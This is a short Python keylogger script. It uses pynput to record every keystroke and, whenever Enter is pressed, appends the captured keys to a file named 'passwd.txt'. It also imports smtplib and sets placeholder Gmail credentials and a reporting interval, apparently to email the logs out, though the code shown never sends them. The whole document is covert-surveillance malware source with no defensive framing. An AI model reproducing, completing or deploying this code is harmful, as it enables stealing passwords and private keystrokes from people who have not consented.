import pynput
from pynput.keyboard import Key, Listener
import smtplib
import Orders

SEND_REPORT_EVERY = 60 # in seconds, 60 means 1 minute and so on
EMAIL_ADDRESS = "thisisafakegmail@gmail.com"
EMAIL_PASSWORD = "thisisafakepassword"
keys = []


def onPress(key):
    keys.append(key)
    if key == Key.enter:
        writeFile()
    print(key)

def writeFile():
    with open("passwd.txt", "a") as save:
            save.write(str(keys))

def onRelease(key):
    if key == Key.esc:
        return False

with Listener(on_press = onPress, on_release = onRelease) as listener:
    listener.join()